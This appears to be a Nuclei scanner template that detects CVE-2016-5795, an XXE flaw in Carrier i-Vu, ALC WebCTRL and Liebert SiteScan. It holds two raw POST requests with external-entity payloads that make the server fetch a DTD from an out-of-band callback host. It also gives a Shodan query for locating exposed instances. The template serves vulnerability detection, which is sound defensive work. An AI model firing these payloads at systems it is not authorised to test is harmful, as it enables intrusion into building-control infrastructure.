id: CVE-2016-5795

info:
  author: AdnaneKhan
  severity: medium
  name: Carrier/ALC i-Vu, WebCTRL, Liebert SiteScan XXE
  description: |
    An XXE issue was discovered in Automated Logic Corporation (ALC) Liebert SiteScan Web Version 6.5 and prior, ALC WebCTRL Version 6.5 and prior, and Carrier i-Vu Version 6.5 and prior. An attacker could enter malicious input to WebCTRL, i-Vu, or SiteScan Web through a weakly configured XML parser causing the application to execute arbitrary code or disclose file contents from a server or connected network.
  tags: cve,cve2016,xxe,ssrf
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2016-5795
    - https://www.cisa.gov/uscert/ics/advisories/ICSA-17-150-01
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2016-5795
    cwe-id: CWE-611
  metadata:
    shodan-query: html:"/_common/lvl5/dologin.jsp"
requests:
  - raw:
      - |
        POST {{BaseURL}}/_common/servlet/lvl5/msgservlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://{{interactsh-url}}/configuration.dtd"> %xxe;]>
    matchers:
    - type: regex
      part: interactsh_request
      regex:
      - ".*configuration.*"
  - raw:
      - |
        @timeout: 25s
        POST {{BaseURL}}/_common/servlet/lvl5/msgservlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://{{interactsh-url}}/schema.dtd"> %xxe;]>
    matchers:
    - type: dsl
      dsl:
        - 'status_code==200 && duration>=5'
